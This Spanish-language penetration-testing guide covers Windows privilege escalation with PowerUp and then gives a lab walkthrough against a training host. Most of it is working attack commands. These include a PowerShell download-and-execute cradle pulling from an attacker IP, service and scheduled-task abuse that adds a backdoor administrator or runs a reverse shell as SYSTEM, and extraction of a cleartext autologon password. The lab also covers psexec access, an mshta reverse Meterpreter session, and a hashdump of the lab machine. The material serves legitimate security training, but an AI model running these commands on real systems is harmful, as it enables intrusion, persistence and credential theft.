
# Windows Privilege Escalation Scripts

## <mark style="color:purple;">PowerUp</mark>

**PowerUp** es un script de PowerShell diseñado para la enumeración de vectores de escalada de privilegios en sistemas Windows. Es parte del framework **PowerSploit** y se utiliza en pruebas de penetración para identificar configuraciones erróneas que pueden permitir la elevación de privilegios.

{% embed url="<https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc>" %}

#### Características Principales

PowerUp automatiza la búsqueda de:

* Permisos incorrectos en servicios
* Binarios ejecutables con permisos débiles
* Tareas programadas explotables
* AlwaysInstallElevated
* Credenciales en archivos de configuración
* Modificaciones de registro peligrosas
* DLL hijacking

#### Instalación y Carga

```bash
# Descargar PowerUp en Kali
git clone https://github.com/PowerShellMafia/PowerSploit.git
cd PowerSploit/Privesc/
python3 -m http.server 80

# En la máquina Windows objetivo, cargar PowerUp
# Método 1: Descargar directamente en memoria
powershell -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<IP-Atacante>/PowerUp.ps1'); Invoke-AllChecks"

# Método 2: Subir el archivo y ejecutar
upload /usr/share/powershell/Privesc/PowerUp.ps1
powershell -exec bypass
Import-Module .\PowerUp.ps1
```

### Comandos y Ejemplos Prácticos

#### **1. Invoke-AllChecks - Escaneo completo**

El comando más utilizado, ejecuta todas las comprobaciones:

```powershell
# Ejecutar todos los chequeos
Invoke-AllChecks

# Guardar resultados en archivo
Invoke-AllChecks | Out-File -FilePath powerup_results.txt

# Salida detallada
Invoke-AllChecks -Verbose
```

**Ejemplo de salida:**

```powershell
ServiceName   : VulnService
Path          : C:\Program Files\Vuln\vuln.exe
ModifiableFile: C:\Program Files\Vuln\vuln.exe
StartName     : LocalSystem
AbuseFunction : Install-ServiceBinary -Name VulnService
```

#### **2. Enumeración de Servicios**

```powershell
# Encontrar servicios con permisos modificables
Get-ServiceUnquoted

# Servicios con binarios modificables
Get-ModifiableServiceFile

# Servicios con permisos débiles
Get-ModifiableService
```

#### **3. AlwaysInstallElevated**

Verifica si las instalaciones MSI se ejecutan como SYSTEM:

```powershell
# Comprobar AlwaysInstallElevated
Get-RegistryAlwaysInstallElevated

# Si está habilitado, crear un MSI malicioso
Write-UserAddMSI
```

#### **4. Tareas Programadas**

```powershell
# Enumerar tareas programadas modificables
Get-ScheduledTask

# Encontrar tareas que se ejecutan como SYSTEM
Get-ScheduledTaskCompatible

# Modificar tarea existente
# Primero, encontrar tarea vulnerable
PS> Get-ScheduledTask | Where-Object {$_.TaskPath -like "*Vuln*"}

TaskName    : UpdateTask
TaskPath    : \Microsoft\Windows\Update\
Author      : NT AUTHORITY\SYSTEM

# Modificar acción de la tarea
schtasks /change /tn "UpdateTask" /tr "C:\temp\reverse.exe" /ru SYSTEM
schtasks /run /tn "UpdateTask"
```

#### **5. Credenciales y Archivos de Configuración**

```powershell
# Buscar credenciales en archivos
Find-InterestingFile

# Buscar en archivos de configuración
Get-ApplicationHost
Get-WebConfig

# Buscar en registro
Get-UserCredentials
Get-RegistryAutoLogon
```

#### **7. Comandos Combinados en Meterpreter**

```powershell
# En sesión de Meterpreter
meterpreter > upload /usr/share/powershell/Privesc/PowerUp.ps1
meterpreter > shell

# En shell de Windows
powershell -exec bypass
Import-Module .\PowerUp.ps1

# Ejecutar chequeos
Invoke-AllChecks

# Abusar de servicio vulnerable
Install-ServiceBinary -Name VulnerableService -UserName "backdoor" -Password "Pass123!"

# Reiniciar servicio
Restart-Service -Name VulnerableService
```

#### Ejemplo Completo de Elevación

```powershell
# 0. Execution Policy Bypass
powershell -ep bypass

# 1. Cargar PowerUp
IEX(New-Object Net.WebClient).DownloadString('http://<IP-Atacante>/PowerUp.ps1')

# 2. Ejecutar chequeos
$results = Invoke-AllChecks

# 3. Mostrar servicios vulnerables
$results | Where-Object {$_.ModifiableFile -ne $null}

# 4. Abusar de servicio específico
# Ejemplo: Servicio con binario modificable
Install-ServiceBinary -Name VulnService -Command "net localgroup administrators backdoor /add"

# 5. Reiniciar servicio
Restart-Service VulnService

# 6. Verificar usuario añadido
net localgroup administrators
```

***

## <mark style="color:purple;">Lab: PowerUp</mark>

Tu tarea consiste en ejecutar el script de PowerShell PowerUp.ps1 para encontrar una vulnerabilidad común de escalada de privilegios en Windows que depende de configuraciones incorrectas.

En este entorno de laboratorio, se le proporcionará acceso a la interfaz gráfica de usuario (GUI) de una máquina Kali de ataque y de una máquina Windows de destino.

**Objetivo:** Obtener acceso a la sesión de meterpreter con altos privilegios.

#### Hosts

Nuestro objetivo es `demo.ine.local`:

```bash
┌──(root㉿attackdefense)-[~]
└─# cat /etc/hosts

127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.1.0.4        attackdefense.com attackdefense
127.0.0.1 AttackDefense-Kali
10.10.37.4      attackdefense.com attackdefense
10.2.18.196    demo.ine.local
```

En este laboratorio podemos alternar fácilmente entre la máquina Kali y la máquina Windows objetivo:

<figure><img src="/files/za89eNeFeefTp2lILwSJ" alt=""><figcaption></figcaption></figure>

Dentro de la máquina Windows tenemos ya disponible Powersploit, por lo que partiremos desde aquí:

```powershell
PS C:\Users\student> cd .\Desktop\PowerSploit\
PS C:\Users\student\Desktop\PowerSploit> ls

    Directory: C:\Users\student\Desktop\PowerSploit

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/24/2020   5:35 AM                AntivirusBypass
d-----       10/24/2020   5:35 AM                CodeExecution
d-----       10/24/2020   5:35 AM                docs
d-----       10/24/2020   5:35 AM                Exfiltration
d-----       10/24/2020   5:35 AM                Mayhem
d-----       10/24/2020   5:35 AM                Persistence
d-----       10/24/2020   5:35 AM                Privesc
d-----       10/24/2020   5:35 AM                Recon
d-----       10/24/2020   5:35 AM                ScriptModification
d-----       10/24/2020   5:35 AM                Tests
-a----        8/17/2020   4:13 PM           2638 .gitignore
-a----        8/17/2020   4:13 PM           1590 LICENSE
-a----        8/17/2020   4:13 PM           8505 mkdocs.yml
-a----        8/17/2020   4:13 PM           5278 PowerSploit.psd1
-a----        8/17/2020   4:13 PM            149 PowerSploit.psm1
-a----        8/17/2020   4:13 PM          15646 PowerSploit.pssproj
-a----        8/17/2020   4:13 PM            971 PowerSploit.sln
-a----        8/17/2020   4:13 PM          10225 README.md
```

### Importar módulo y ejecutar

```powershell
PS C:\Users\student\Desktop\PowerSploit> Import-Module .\PowerSploit.psd1
PS C:\Users\student\Desktop\PowerSploit> Invoke-AllChecks

ModifiablePath    : C:\Users\student\AppData\Local\Microsoft\WindowsApps
IdentityReference : PRIVILEGE-ESCAL\student
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\student\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\student\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\student\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'

DefaultDomainName    :
DefaultUserName      : Administrator
DefaultPassword      : Str0ng_Password_123321
AltDefaultDomainName :
AltDefaultUserName   :
AltDefaultPassword   :
Check                : Registry Autologons
```

Conseguimos una contraseña de administrador en plano!&#x20;

### Explotación manual

De igual manera lo podríamos consultar manualmente con las siguientes líneas, sin depender de PowerUp:

```powershell
PS C:\Users\student\Desktop\PowerSploit> reg query 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' /V DefaultUserName

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    DefaultUserName    REG_SZ    Administrator

PS C:\Users\student\Desktop\PowerSploit> reg query 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' /V DefaultPassword

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    DefaultPassword    REG_SZ    Str0ng_Password_123321
```

Para comprobar que tenemos privilegios abrimos una powershell como administrador y podemos la contraseña:

```powershell
PS C:\Windows\system32> whoami
privilege-escal\administrator
```

### Runas

Si sabemos la contraseña de un usuario podemos usar `runas.exe` para ejecutar una shell en su nombre:

```powershell
PS C:\Users\student> runas.exe /user:Administrator cmd

Enter the password for Administrator:
Attempting to start cmd as user "PRIVILEGE-ESCAL\Administrator" ...
```

<figure><img src="/files/DXouBuanjhe7VxNVUW4R" alt=""><figcaption></figcaption></figure>

### Acceso desde Kali

Si tenemos una contraseña válida podemos acceder desde kali con Impacket PSExec:

```bash
┌──(root㉿attackdefense)-[~]
└─# impacket-psexec administrator@demo.ine.local

Impacket v0.12.0.dev1 - Copyright 2023 Fortra

Password:
[*] Requesting shares on demo.ine.local.....
[*] Found writable share ADMIN$
[*] Uploading file qKGQxQVG.exe
[*] Opening SVCManager on demo.ine.local.....
[*] Creating service GXEN on demo.ine.local.....
[*] Starting service GXEN.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1457]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

### Acceso a la flag

```powershell
PS C:\Users\Administrator\Desktop> ls

    Directory: C:\Users\Administrator\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/24/2020   5:37 AM             32 flag.txt

PS C:\Users\Administrator\Desktop> type .\flag.txt
b5b037a78522671b89a2c1b2********
```

### Explotación desde Kali: HTA Server

Podemos usar HTA Server para explotar un objetivo Windows al que tenemos acceso.

{% hint style="success" %}
También podríamos usar el exploit `windows/smb/psexec` para acceder directamente con el usuario y contraseña
{% endhint %}

```bash
msfconsole
use exploit/windows/misc/hta_server
exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.37.4:4444 
[*] Using URL: http://10.10.37.4:8080/Cei6wChl1pUhz.hta
[*] Server started.
```

La URL que nos genera la ejecutamos con `mshta.exe` desde Windows:

```powershell
PS C:\Users\student> mshta.exe http://10.10.37.4:8080/Cei6wChl1pUhz.hta
```

Y recibimos la sesión de Meterpreter:

```bash
[*] 10.2.18.196      hta_server - Delivering Payload
[*] Sending stage (176198 bytes) to 10.2.18.196
[*] Meterpreter session 1 opened (10.10.37.4:4444 -> 10.2.18.196:49829) at 2026-03-30 18:43:16 +0530

msf6 exploit(windows/misc/hta_server) > sessions 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: PRIVILEGE-ESCAL\student
```

Si lo ejecutamos directamente desde la shell de Administrador que nos dió runas.exe directamente obtenemos una Meterpreter como admin y podemos hacer lo que queramos, como elevar a SYSTEM y volcar todos los hashes:

```bash
[*] 10.2.18.196      hta_server - Delivering Payload
[*] Sending stage (176198 bytes) to 10.2.18.196
[*] Meterpreter session 2 opened (10.10.37.4:4444 -> 10.2.18.196:49835) at 2026-03-30 18:45:31 +0530

msf6 exploit(windows/misc/hta_server) > sessions 

Active sessions
===============

  Id  Name  Type                     Information                                      Connection
  --  ----  ----                     -----------                                      ----------
  1         meterpreter x86/windows  PRIVILEGE-ESCAL\student @ PRIVILEGE-ESCAL        10.10.37.4:4444 -> 10.2.18.196:49829 (10.2.18.196)
  2         meterpreter x86/windows  PRIVILEGE-ESCAL\Administrator @ PRIVILEGE-ESCAL  10.10.37.4:4444 -> 10.2.18.196:49835 (10.2.18.196)

msf6 exploit(windows/misc/hta_server) > sessions 2
[*] Starting interaction with 2...

meterpreter > getuid
Server username: PRIVILEGE-ESCAL\Administrator

meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).

meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3257eb9c655aa28d88a538cdb131423b:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
student:1008:aad3b435b51404eeaad3b435b51404ee:bd4ca1fbe028f3c5066467a7f6a73b0b:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
```
